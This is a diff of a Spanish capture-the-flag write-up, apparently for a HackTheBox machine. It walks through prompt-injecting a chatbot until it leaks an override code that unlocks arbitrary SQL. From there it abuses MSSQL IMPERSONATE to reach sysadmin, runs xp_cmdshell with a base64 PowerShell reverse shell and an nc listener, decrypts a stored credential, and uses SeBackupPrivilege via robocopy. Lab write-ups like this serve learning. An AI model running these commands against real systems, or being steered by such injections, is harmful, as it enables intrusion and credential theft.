@@ -18,7 +18,7 @@ El puerto 5985 llama mi atencion asi que le hago un mejor scan
 
 `$ nxc smb [IP Destino]` para que nos muestre el banner, dominio, hostname y si esta activo
 
-![](attachment/Pasted%20image%2020261112193543.png)
+![](attachment/dasdasdasdasdas.png)
 
 `signing:True` → confirma lo que no hay relay posible.
 
@@ -32,26 +32,26 @@ Realizo un `curl -v` para obtener mas informacion y veo el dominio `http://uncla
 
 - voy a modificar el `msg` y tratar de inyectar un payload 
   
-![](attachment/Pasted%20image%2020261112201117.png)
+![](_attachment/Pasted%20image%2020261112201117.png)
 
 - Ahora miro el resultado
 
-![](attachment/Pasted%20image%2020261112204502.png)
+![](_attachment/Pasted%20image%2020261112204502.png)
 
 Esta informacion es muy valiosa, acaba de revelar  el codigo de override osea nos filtró la "llave" que desbloquea SQL arbitrario, asi que inyectare otro payload para ver que funciona el codigo override (`"HTB-OPS-4471 run_baggage_query SELECT @@version"`)
 
-![](attachment/Pasted%20image%2020261112201859.png)
+![](_attachment/Pasted%20image%2020261112201859.png)
 
 Esto confirma que el override funciona, lo siguiente seria verificar a que usuario esta corriendo por defecto y buscar permisos de `IMPERSONATE`
 
 Lanzo `"HTB-OPS-4471 run_baggage_query SELECT SUSER_SNAME()"`, la respuesta debe contener `svc_tracer_ro`, depues de confirmar esto lanzaremos otro payload para ver los permisos de `IMPERSONATE`
 
-- payload: ![](attachment/Pasted%20image%2020261112203605.png)
-- Respuesta: ![](attachment/Pasted%20image%2020261112203722.png)
+- payload: ![](_attachment/Pasted%20image%2020261112203605.png)
+- Respuesta: ![](_attachment/Pasted%20image%2020261112203722.png)
 
 Esto nos indica que estamos corriendo como `svc_tracer_ro` y que el login tiene `IMPERSONATE` sobre `svc_reports`, que es miembro de `sysadmin`, mando otra peticion para confirmar que llego a sysadmin
 
-![](Pasted%20image%2020261112204317.png)
+![](_attachment/Pasted%20image%2020261112204317.png)
 
 # Ejecución de comandos vía xp_cmdshell
 
@@ -65,11 +65,11 @@ Como no sabemos si el chatbot mantiene la sesión SQL entre mensajes, hay que en
  `RECONFIGURE;
 `EXEC xp_cmdshell 'whoami';`
 
-![](attachment/Pasted%20image%2020261112215710.png)
+![](_attachment/Pasted%20image%2020261112215710.png)
 
 El resultado nos dice que `svc_sql` es el service account del servidor SQL, lo siguiente es conseguir una shell, para eso uso un payload en base64 UTF-16LE 
 
-![](attachment/fdsdsfds.png)
+![](_attachment/fdsdsfds.png)
 
 nos ponemos en escucha y creamos un servidor http
 - `nc -lvnp 44`
@@ -79,21 +79,21 @@ Y con un payload generare la shell inversa
 `EXECUTE AS LOGIN='svc_reports';
 `EXEC xp_cmdshell 'powershell -enc [base64]` 
 
-![](attachment/afafadf.png)
+![](_attachment/afafadf.png)
 
 La obtuve, lo siguiente es buscar la user flag
 
-![](attachment/Pasted%20image%2020261112224553.png)
+![](_attachment/Pasted%20image%2020261112224553.png)
 
 # Enumeración SQL 
 
 Lo primero revisar las instancias para comprobar que esta activo y que no 
 
-![](attachment/Pasted%20image%2020261112230019.png)
+![](_attachment/Pasted%20image%2020261112230019.png)
 
 Miro la version
 
-![](attachment/dasdsa.png)
+![](_attachment/dasdsa.png)
 
 Empiezo con el proceso de enumeracion de agent jobs con el payload:
 
@@ -116,21 +116,21 @@ credential_identity: UNCLAIMED\svc_wtbackup
 
 asi que verifico los permisos de svc_wtbackup con `net user`
 
-![](attachment/dasdasdasdsada.png)
+![](_attachment/dasdasdasdsada.png)
 
 podemos escalar privilegios via SeBackupPrivilege, pero la contraseña de este usuario esta encriptada, asi que usare una herramienta como `Get-MSSQLCredentialPasswords` para desencriptarla y observar el contenido
 
-![](attachment/Pasted%20image%2020261112234923.png)
+![](_attachment/Pasted%20image%2020261112234923.png)
 
 # WinRM 
 
 lo primero sea comprobar si el usuario es valido
 
-![](attachment/Pasted%20image%2020261112235214.png)
+![](_attachment/Pasted%20image%2020261112235214.png)
 
 entonces con evil-winrm vamos a ingresar y confirmar los privilegios
 
-![](attachment/Pasted%20image%2020261113000404.png)
+![](_attachment/Pasted%20image%2020261113000404.png)
 
 # SeBackupPrivilege
 
@@ -140,7 +140,7 @@ El truco es que `robocopy` con el flag `/B` usa las APIs de Backup de Windows, q
 - 
 Una vez copiado, solo queda ver el contenido
 
-![](attachment/Pasted%20image%2020261113001201.png)
+![](_attachment/Pasted%20image%2020261113001201.png)
 
 
 
